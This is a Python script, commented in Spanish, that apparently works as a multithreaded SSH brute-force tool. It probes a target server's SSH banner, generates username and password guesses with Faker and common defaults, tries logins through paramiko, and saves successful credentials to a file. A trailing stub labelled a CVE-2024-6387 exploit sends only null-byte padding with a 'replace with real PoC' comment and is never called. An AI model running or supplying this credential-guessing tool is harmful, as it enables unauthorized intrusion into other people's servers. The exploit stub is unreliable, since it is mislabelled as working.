import paramiko
import threading
import queue
import time
import socket
import random
import argparse
from faker import Faker

# Configuración inicial
fake = Faker()
q = queue.Queue()
found = False
lock = threading.Lock()

# Lista de usuarios comunes
default_users = ["root","admin","ubuntu","pi","user","test"]

# Generador de contraseñas dinámicas
def generate_dynamic_payloads(num=1000):
    passwords = []
    common = ["password","123456","admin123","qwerty","toor","letmein"]
    passwords.extend(common)
    
    for i in range(num):
        passwords.append(fake.password(length=random.randint(8, 12)))
        passwords.append(f"{fake.user_name()}{random.randint(1, 999)}")
        passwords.append(f"{fake.company().replace(' ', '')}{random.randint(2020, 2025)}")
    return list(set(passwords))

# Conectar y probar credenciales
def try_ssh(ip, port, user, pwd):
    global found
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=user, password=pwd, timeout=3)
        with lock:
            if not found:
                print(f"[+] ¡Joder, éxito! Login: {user}:{pwd}")
                found = True
                with open("creds.txt","a") as f:
                    f.write(f"{ip}:{port} - {user}:{pwd}\n")
        client.close()
        return True
    except Exception:
        return False
    finally:
        client.close()

# Worker para hilos
def worker(ip, port):
    while not q.empty() and not found:
        user, pwd = q.get()
        if try_ssh(ip, port, user, pwd):
            break
        q.task_done()

# Escanear versión de SSH
def scan_ssh_version(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        sock.send(b"SSH-2.0-Test\n")
        banner = sock.recv(1024).decode().strip()
        sock.close()
        print(f"[*] Versión SSH: {banner}")
        return banner
    except:
        return None

# Main
def main(ip, port, threads, user_list, pass_list):
    global found
    print(f"[*] Jodiendo servidor: {ip}:{port} con {threads} hilos")
    
    banner = scan_ssh_version(ip, port)
    if not banner:
        print("[!] No se pudo obtener la versión SSH, pero seguimos jodiendo")
    
    users = default_users if not user_list else open(user_list,"r").read().splitlines()
    passwords = generate_dynamic_payloads() if not pass_list else open(pass_list,"r").read().splitlines()
    
    for user in users:
        for pwd in passwords:
            q.put((user, pwd))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=worker, args=(ip, port))
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()
    
    if not found:
        print("[!] No se encontraron credenciales, prueba más payloads o jode otra cosa")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fuerza bruta SSH avanzada")
    parser.add_argument("ip", help="IP del servidor")
    parser.add_argument("--port", type=int, default=22, help="Puerto SSH")
    parser.add_argument("--threads", type=int, default=10, help="Número de hilos")
    parser.add_argument("--users", help="Archivo con lista de usuarios")
    parser.add_argument("--passwords", help="Archivo con lista de contraseñas")
    args = parser.parse_args()
    
    main(args.ip, args.port, args.threads, args.users, args.passwords)
    
    
def try_cve_2024_6387(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        payload = b"SSH-2.0-OpenSSH_8.9\n" + b"\x00" * 1000  # Reemplaza con PoC real
        sock.send(payload)
        response = sock.recv(1024)
        print(f"[*] Exploit CVE-2024-6387 enviado, respuesta: {response.decode()}")
        sock.close()
        return True
    except:
        print("[!] Exploit CVE-2024-6387 falló")
        return False

